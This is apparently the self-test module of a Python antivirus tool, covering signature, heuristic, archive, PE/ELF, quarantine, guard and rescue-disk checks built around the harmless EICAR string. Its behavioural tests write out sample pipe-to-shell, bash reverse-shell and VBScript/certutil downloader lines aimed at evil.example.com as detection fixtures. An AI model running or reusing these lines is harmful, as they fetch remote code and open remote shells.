"""Built-in self test.

Proves that every detection layer, the quarantine and the signature editor
work — using the standard, *harmless* EICAR antivirus test string (a plain
text marker that antivirus vendors agree to detect; it is not malware).
"""
from __future__ import annotations

import hashlib
import os
import random
import re
import shutil
import sys
import tempfile
import time
from pathlib import Path
from typing import List, Optional

from .config import Config
from .quarantine import Quarantine
from .scanner import Scanner
from .signatures import Signature, SignatureDB
from .utils import md5_new

EICAR = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def _iso_structure_ok(img: bytes, n_files: int) -> bool:
    """Minimal ISO 9660 reader: PVD, SVD, root directory, path tables."""
    sector = 2048
    if len(img) % sector or len(img) // sector < 6:
        return False
    if img[2048:2053] != b"CD001" or img[2053] != 1 or img[2054] != 1:
        return False                       # PVD
    if int.from_bytes(img[2119:2123], "little") != len(img) // sector:
        return False                       # volume space size
    if img[4096:4101] != b"CD001" or img[4102] != 255:
        return False                       # SVD

    root_sector = img[3 * sector:4 * sector]
    off, count = 0, 0
    while off < sector and root_sector[off] != 0:
        n = root_sector[off]
        if n < 33 or off + n > sector:
            return False
        ext = int.from_bytes(root_sector[off + 2:off + 6], "little")
        fsize = int.from_bytes(root_sector[off + 10:off + 14], "little")
        flags = root_sector[off + 25]
        namelen = root_sector[off + 32]
        if 33 + namelen > n or not root_sector[off + 33:off + 33 + namelen].isascii():
            return False
        name = root_sector[off + 33:off + 33 + namelen]
        if name not in (b".", b".."):
            if flags != 0 or ext * sector + fsize > len(img):
                return False
            count += 1
        off += n

    pt = int.from_bytes(img[2048 + 379:2048 + 383], "little")
    table = img[pt * sector:(pt + 1) * sector]
    off, entries = 0, 0
    while off < sector and table[off] != 0:
        n = table[off]
        if n < 23 or off + n > sector:
            return False
        off += n
        entries += 1
    return count == n_files and entries == n_files + 1


def run_selftest(signatures_file: Optional[str] = None) -> int:
    print(f"AntiVirus self test  (Python {sys.version.split()[0]})")
    print("-" * 62)
    workdir = Path(tempfile.mkdtemp(prefix="antivirus-selftest-"))
    results: List[bool] = []

    def check(name: str, ok: bool, detail: str = "") -> None:
        results.append(bool(ok))
        line = f"  [{'PASS' if ok else 'FAIL'}] {name}"
        if detail and not ok:
            line += f"  ({detail})"
        print(line)

    try:
        config = Config()
        config.quarantine_dir = workdir / "quarantine"
        config.report_dir = workdir / "reports"
        config.signatures_file = workdir / "signatures.json"

        # Work on a private copy of a database, never a shared one. The
        # rescue kit passes its own snapshot via *signatures_file*.
        bundled = Path(__file__).resolve().parent.parent / "data" / "signatures.json"
        if signatures_file and Path(signatures_file).is_file():
            shutil.copyfile(signatures_file, config.signatures_file)
        elif bundled.exists():
            shutil.copyfile(bundled, config.signatures_file)
        db = SignatureDB(config.signatures_file)
        if not db.list():  # no bundled DB available – create the EICAR entry
            db.add(Signature(
                id="EICAR-STD-2014",
                name="EICAR-Test-File",
                category="test",
                severity="critical",
                description="Standard antivirus industry test string (harmless).",
                sha256=hashlib.sha256(EICAR).hexdigest(),
                md5=(lambda h: (h.update(EICAR), h.hexdigest())[-1])(md5_new()),
                pattern=re.escape(EICAR.decode("ascii")),
            ))
        scanner = Scanner(config, db)
        quarantine = Quarantine(config.quarantine_dir)

        check("signature database loaded", len(db.list()) > 0,
              f"{len(db.list())} signatures")
        check("EICAR signature present",
              any(s.id == "EICAR-STD-2014" for s in db.list()))

        # -- hash detection --------------------------------------------------
        eicar = workdir / "eicar.txt"
        eicar.write_bytes(EICAR)
        findings = scanner.scan_file(eicar)
        check("hash detection (EICAR, exact file)",
              any(f.kind == "signature-hash" for f in findings),
              str(sorted({f.kind for f in findings})))

        # -- pattern detection ------------------------------------------------
        wrapped = workdir / "wrapped.bin"
        wrapped.write_bytes(b"\x00\x01" * 50 + EICAR + b"\xff" * 50)
        findings = scanner.scan_file(wrapped)
        check("pattern detection (EICAR embedded in binary)",
              any(f.kind == "signature-pattern" for f in findings),
              str(sorted({f.kind for f in findings})))

        # -- clean file ---------------------------------------------------------
        clean = workdir / "clean.txt"
        clean.write_text("nothing to see here\n" * 5)
        check("clean file not flagged", scanner.scan_file(clean) == [])

        # -- directory walk -----------------------------------------------------
        result = scanner.scan_path(workdir)
        check("directory walk finds all files",
              result.files_scanned >= 3, f"scanned {result.files_scanned} files")

        # -- high-entropy heuristic -----------------------------------------------
        packed = workdir / "packed.bin"
        packed.write_bytes(random.Random(42).randbytes(300 * 1024))
        findings = scanner.scan_file(packed)
        check("high-entropy heuristic flags packed-looking file",
              any(f.kind == "heuristic" for f in findings),
              str(sorted({f.kind for f in findings})))

        # -- quarantine + restore ---------------------------------------------------
        victim = workdir / "victim-eicar.txt"
        victim.write_bytes(EICAR)
        findings = scanner.scan_file(victim)
        item = quarantine.put(victim, findings[0])
        check("quarantine removes the file", not victim.exists())
        check("quarantine manifest updated",
              any(i.id == item.id for i in quarantine.items()))
        restored, target = quarantine.restore(item.id)
        check("restore puts the file back",
              target.exists() and target.read_bytes() == EICAR)

        # -- kill engine (in-place obfuscation + registry) --------------------------
        from .kill import KillRegistry, transform

        killer = KillRegistry(workdir / "registry")
        kfile = workdir / "killer-victim.txt"
        kfile.write_bytes(EICAR)
        kfindings = scanner.scan_file(kfile)
        kitem = killer.kill(kfile, kfindings[0])
        obfuscated = kfile.read_bytes()
        check("kill obfuscates the file in place (bytes change, path kept)",
              kfile.exists() and obfuscated != EICAR
              and kfile.name == "killer-victim.txt",
              f"len={len(obfuscated)}")
        check("kill stores key + IV in the registry",
              len(kitem.key) == 64 and len(kitem.iv) == 32
              and any(e.id == kitem.id for e in killer.entries()),
              f"key={kitem.key[:8]}… iv={kitem.iv[:8]}…")
        check("kill is reversible with the stored key/IV",
              transform(obfuscated, bytes.fromhex(kitem.key),
                        bytes.fromhex(kitem.iv)) == EICAR)
        # A rescan must treat the killed file as inert (not re-flag it).
        scanner.neutralized = {e.ciphertext_sha256: e.id
                               for e in killer.entries()}
        rescanned = scanner.scan_file(kfile)
        check("rescan does not re-flag a killed (neutralized) file",
              rescanned == [],
              str(sorted({f.name for f in rescanned})))
        _revived, rtarget = killer.revive(kitem.id)
        check("kill revive restores the exact original bytes",
              rtarget.exists() and rtarget.read_bytes() == EICAR
              and all(e.id != kitem.id for e in killer.entries()))
        # purge: kill again, then destroy file + entry
        scanner.neutralized = {}
        kitem2 = killer.kill(kfile, scanner.scan_file(kfile)[0])
        killer.purge(kitem2.id)
        check("kill purge destroys file and registry entry",
              not kfile.exists()
              and all(e.id != kitem2.id for e in killer.entries()))
        scanner.neutralized = {}

        # -- custom signature --------------------------------------------------------
        marker = "SELFTEST-UNIQUE-MARKER-42"
        db.add(Signature(
            id="SELFTEST-1",
            name="SelfTest-Marker",
            category="test",
            severity="low",
            description="selftest marker",
            pattern=marker,
        ))
        sample = workdir / "marked.txt"
        sample.write_text(f"prefix {marker} suffix\n")
        findings = scanner.scan_file(sample)
        check("custom signature (added at runtime) detected",
              any(f.name == "SelfTest-Marker" for f in findings),
              str(sorted({f.name for f in findings})))

        # -- behavioural analysis ------------------------------------------------------
        evil_sh = workdir / "evil.sh"
        evil_sh.write_text(
            "#!/bin/sh\n"
            "curl -fsSL http://evil.example.com/x.sh | sh\n"
            "bash -i >& /dev/tcp/10.0.0.9/4444 0>&1\n"
        )
        findings = scanner.scan_file(evil_sh)
        check("behaviour: pipe-to-shell + reverse shell detected",
              any(f.kind == "behavior" and f.severity == "high" for f in findings),
              str(sorted({f.name for f in findings})))

        clean_py = workdir / "clean.py"
        clean_py.write_text("def main():\n    print('hello')\n\nmain()\n")
        findings = scanner.scan_file(clean_py)
        check("behaviour: clean python not flagged",
              not any(f.kind == "behavior" for f in findings),
              str(sorted({f.name for f in findings})))

        evil_vbs = workdir / "evil.vbs"
        evil_vbs.write_text(
            "Set shell = CreateObject(\"WScript.Shell\")\n"
            "Set http = CreateObject(\"MSXML2.ServerXMLHTTP\")\n"
            "http.Open \"GET\", \"http://evil.example.com/s.bin\", False\n"
            "http.Send\n"
            "shell.Run \"certutil -urlcache -f http://evil.example.com/x.exe\", 0\n"
        )
        findings = scanner.scan_file(evil_vbs)
        vbs_high = [f for f in findings if f.kind == "behavior"
                    and f.severity == "high"]
        check("behaviour: VBScript dropper detected (VBS layer)",
              len(vbs_high) >= 2,
              str(sorted({f.name for f in findings})))

        clean_vbs = workdir / "clean.vbs"
        clean_vbs.write_text(
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
            "WScript.Echo \"done\" & Now()\n"
        )
        findings = scanner.scan_file(clean_vbs)
        check("behaviour: clean VBScript not flagged",
              not any(f.kind == "behavior" for f in findings),
              str(sorted({f.name for f in findings})))

        from .samples import SUSPICIOUS_PE_DLLS, build_sample_pe

        pe = workdir / "suspicious.exe"
        pe.write_bytes(build_sample_pe(SUSPICIOUS_PE_DLLS))
        findings = scanner.scan_file(pe)
        check("behaviour: suspicious PE import table detected",
              any(f.kind == "behavior" and "injection" in f.name.lower()
                  for f in findings),
              str(sorted({f.name for f in findings})))

        # -- PE debug report ---------------------------------------------------------
        from .pe import parse_pe, pe_indicators
        from .samples import build_packed_pe, build_suspicious_pe

        pe_info = parse_pe(build_suspicious_pe())
        pe_inds = {i.name for i in pe_indicators(pe_info)}
        check("pe debug: suspicious .exe dissected (ASLR off, no relocs, embedded script)",
              pe_info.valid
              and "ASLR disabled" in pe_inds
              and "No base relocations" in pe_inds
              and any("Embedded in resources" in n for n in pe_inds),
              str(sorted(pe_inds)))

        packed = parse_pe(build_packed_pe())
        packed_inds = {i.name for i in pe_indicators(packed)}
        check("pe debug: packed .exe (UPX0 + RELOCS_STRIPPED) detected",
              "Known packer section name" in packed_inds
              and "RELOCS_STRIPPED" in packed_inds,
              str(sorted(packed_inds)))

        # -- scan cache --------------------------------------------------------
        tree = workdir / "cache-tree"
        tree.mkdir()
        (tree / "a.txt").write_text("clean\n")
        (tree / "b.txt").write_text("still clean\n")
        scanner.config.cache_dir = workdir / ".av-cache"
        first = scanner.scan_path(tree)
        second = scanner.scan_path(tree)
        check("scan cache: unchanged files served from cache on rescan",
              first.files_cached == 0 and second.files_cached == 2
              and second.files_scanned == 2,
              f"first={first.files_cached} second={second.files_cached}")

        # -- archive scanning --------------------------------------------------
        from .samples import build_zip_sample

        zipf = workdir / "sneaky.zip"
        zipf.write_bytes(build_zip_sample())
        findings = scanner.scan_file(zipf)
        names = {f.name for f in findings}
        check("archive: EICAR entry found inside ZIP",
              any("sneaky.zip!eicar-test.txt" in f.path and
                  f.kind == "signature-hash" for f in findings),
              str(sorted(names)))
        check("archive: zip-slip entry name flagged",
              "Archive path traversal (zip slip)" in names,
              str(sorted(names)))

        # -- ELF import analysis (v1.6) --------------------------------------
        from .samples import build_suspicious_elf

        elf = workdir / "suspicious.elf"
        elf.write_bytes(build_suspicious_elf())
        findings = scanner.scan_file(elf)
        check("elf: suspicious import table detected (system/execve/popen)",
              any(f.kind == "behavior" and f.name.startswith("ELF imports")
                  and f.severity == "high" for f in findings),
              str(sorted({f.name for f in findings})))

        # -- tar / gzip archive scanning (v1.6) ------------------------------
        from .samples import build_tar_sample

        tgz = workdir / "sneaky.tar.gz"
        tgz.write_bytes(build_tar_sample())
        findings = scanner.scan_file(tgz)
        names = {f.name for f in findings}
        check("archive: EICAR entry found inside TAR.GZ",
              any("sneaky.tar.gz!eicar-test.txt" in f.path and
                  f.kind == "signature-hash" for f in findings),
              str(sorted(names)))
        check("archive: tar-slip entry name flagged",
              "Archive path traversal (tar slip)" in names,
              str(sorted(names)))

        # -- file integrity baseline (v1.7) ----------------------------------
        from .integrity import (
            CHANGED,
            build_manifest,
            compare_baseline,
            file_sha256,
        )

        fim = workdir / "fim-tree"
        fim.mkdir()
        (fim / "keep.txt").write_text("same\n")
        (fim / "edit.txt").write_text("before\n")
        baseline = build_manifest(fim, config)
        (fim / "edit.txt").write_text("AFTER\n")
        current = {
            p.name: {"sha256": file_sha256(p), "size": p.stat().st_size}
            for p in fim.iterdir() if p.is_file()
        }
        fim_findings = compare_baseline(baseline, current)
        check("integrity: changed file detected vs baseline",
              any(f.name == CHANGED for f in fim_findings),
              str(sorted({f.name for f in fim_findings})))

        # -- web console health (v1.7) ----------------------------------------
        import json as _json
        import threading
        import urllib.request
        from http.server import ThreadingHTTPServer

        from .web import WebApp, _Handler

        web_app = WebApp(config, db, scanner, quarantine)
        server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
        server.app = web_app
        web_thread = threading.Thread(target=server.serve_forever,
                                      daemon=True)
        web_thread.start()
        try:
            with urllib.request.urlopen(
                    f"http://127.0.0.1:{server.server_address[1]}/api/health",
                    timeout=10) as resp:
                health = _json.loads(resp.read())
            check("web console: /api/health responds",
                  health.get("ok") is True, str(health))
        except Exception as exc:
            check("web console: /api/health responds", False, str(exc))
        finally:
            server.shutdown()
            server.server_close()

        # -- module API (v1.8) -------------------------------------------------
        import antivirus

        mod_dir = workdir / "module-tree"
        mod_dir.mkdir()
        (mod_dir / "e.txt").write_bytes(EICAR)
        mod_result = antivirus.scan(mod_dir, base=str(workdir),
                                    signatures=str(config.signatures_file))
        check("module API: antivirus.scan() detects EICAR",
              any(f.name == "EICAR-Test-File" for f in mod_result.findings),
              str(sorted({f.name for f in mod_result.findings})))

        # -- TUI model (v1.8) ----------------------------------------------------
        from .tui import TuiModel
        from .web import WebApp

        tui_dir = workdir / "tui-tree"
        tui_dir.mkdir()
        (tui_dir / "e.txt").write_bytes(EICAR)
        model = TuiModel(WebApp(config, db, scanner, quarantine),
                         target=str(tui_dir))
        model.start_scan()
        import time as _time

        for _ in range(200):
            model.tick()
            if not model.running:
                break
            _time.sleep(0.05)
        check("tui: model scan finds the threat",
              model.job is not None and model.job.status == "done"
              and any(f["name"] == "EICAR-Test-File"
                      for f in model.findings),
              model.message)

        # -- verify / export / ioc / stats (v1.9) ---------------------------
        import io as _io

        from .integrity import verify_tree
        from .report import ReportWriter, iter_export_rows, write_export
        from .signatures import parse_ioc_text
        from .api import engine_stats

        fim2 = workdir / "fim2"
        fim2.mkdir()
        (fim2 / "x.txt").write_text("one\n")
        man = build_manifest(fim2, config)
        check("verify: clean tree has no findings",
              verify_tree(fim2, man, config) == [])
        (fim2 / "x.txt").write_text("two\n")
        check("verify: changed file reported (hash-only check)",
              any(f.name == CHANGED
                  for f in verify_tree(fim2, man, config)))

        writer = ReportWriter(config.report_dir)
        writer.save(scanner.scan_path(mod_dir), action="detect")
        buf = _io.StringIO()
        n = write_export(iter_export_rows(writer.all_reports()), buf,
                         fmt="csv")
        check("export: CSV rows written for saved reports",
              n >= 1 and "EICAR" in buf.getvalue(), f"rows={n}")

        ioc_sigs = parse_ioc_text(
            "# comment\n" + hashlib.sha256(EICAR).hexdigest() + "\n"
            "IOC-LITERAL-ABC\n")
        check("ioc: hash + literal lines parsed",
              len(ioc_sigs) == 2
              and bool(ioc_sigs[0].sha256) and bool(ioc_sigs[1].pattern),
              str([s.id for s in ioc_sigs]))

        st = engine_stats(config, db, quarantine)
        check("stats: engine snapshot consistent",
              st["signatures"]["total"] == len(db.list())
              and st["quarantine"]["items"] == len(quarantine.items())
              and st["reports"]["reports"] >= 1,
              str(st.get("signatures")))

        # -- background guard (v2.3) -------------------------------------------
        from .guard import (
            guard_running,
            guard_status,
            start_guard,
            stop_guard,
        )

        guard_dir = workdir / "guard"
        watch_dir = workdir / "guard-watch"
        watch_dir.mkdir()
        (watch_dir / "clean.txt").write_text("nothing to see here\n")
        try:
            info = start_guard(
                target=str(watch_dir), action="quarantine", interval=0.5,
                state_dir=str(guard_dir),
                signatures=str(config.signatures_file))
            check("guard: daemon starts detached and reports its pid",
                  info.get("pid") is not None
                  and guard_running(guard_dir) == info["pid"],
                  str(info))
            (watch_dir / "dropped.txt").write_bytes(EICAR)
            deadline = time.time() + 20
            state = {}
            while time.time() < deadline:
                state = guard_status(guard_dir)
                if state.get("threats_found", 0) >= 1:
                    break
                time.sleep(0.2)
            check("guard: dropped EICAR auto-quarantined within 20 s",
                  state.get("threats_found", 0) >= 1
                  and not (watch_dir / "dropped.txt").exists(),
                  str(state))
            last = state.get("last_event") or {}
            check("guard: state records the threat and the counters",
                  state.get("action") == "quarantine"
                  and last.get("event") in ("threat", "quarantined",
                                            "killed", "deleted")
                  and state.get("files_scanned", 0) >= 1,
                  str(state))
            check("guard: stop returns and clears the pid",
                  stop_guard(str(guard_dir))
                  and guard_running(guard_dir) is None)
        except Exception as exc:  # keep the self test informative
            check("guard: daemon lifecycle", False, repr(exc))

        # -- rescue disk (v2.0) ------------------------------------------------
        from .rescue import (
            KIT_FILES,
            build_rescue_disk,
            run_rescue,
            run_rescue_selftest,
            verify_kit,
        )

        kit_dir = workdir / "rescue-kit"
        rescue = build_rescue_disk(kit_dir, iso_path=workdir / "rescue.iso",
                                   signatures_file=config.signatures_file)
        check("rescue: kit + ISO built (manifest complete)",
              verify_kit(kit_dir) == []
              and rescue["iso_size"] % 2048 == 0
              and rescue["signatures"]["count"] == len(db.list()),
              str(verify_kit(kit_dir))[:200])

        iso_img = Path(rescue["iso"]).read_bytes()
        check("rescue: ISO 9660 structure valid (PVD/SVD/root/path tables)",
              _iso_structure_ok(iso_img, len(KIT_FILES)))

        foreign = workdir / "foreign-disk"
        foreign.mkdir()
        (foreign / "e.txt").write_bytes(EICAR)
        (foreign / "c.txt").write_text("clean\n")
        media_q = workdir / "rescue-quarantine"
        info = run_rescue(
            foreign, action="quarantine",
            quarantine_dir=str(media_q),
            report_dir=str(workdir / "rescue-reports"),
            signatures_file=str(config.signatures_file))
        check("rescue: threat quarantined to the rescue side, "
              "scanned disk otherwise untouched",
              not (foreign / "e.txt").exists()
              and (foreign / "c.txt").exists()
              and len(list((media_q / "files").glob("*"))) == 1
              and info["report"].exists()
              and not (foreign / "rescue-quarantine").exists())

        if os.environ.get("AV_RESCUE_NESTED_SELFTEST"):
            # Running as a rescue-kit media check: don't spawn another.
            check("rescue: kit self test (nested — skipped)", True)
        else:
            rc, _tail = run_rescue_selftest(kit_dir)
            check("rescue: kit self test passes (media check)", rc == 0,
                  _tail[-200:])

    finally:
        shutil.rmtree(workdir, ignore_errors=True)

    passed = sum(results)
    print("-" * 62)
    print(f"Self test: {passed}/{len(results)} checks passed")
    return 0 if passed == len(results) else 1
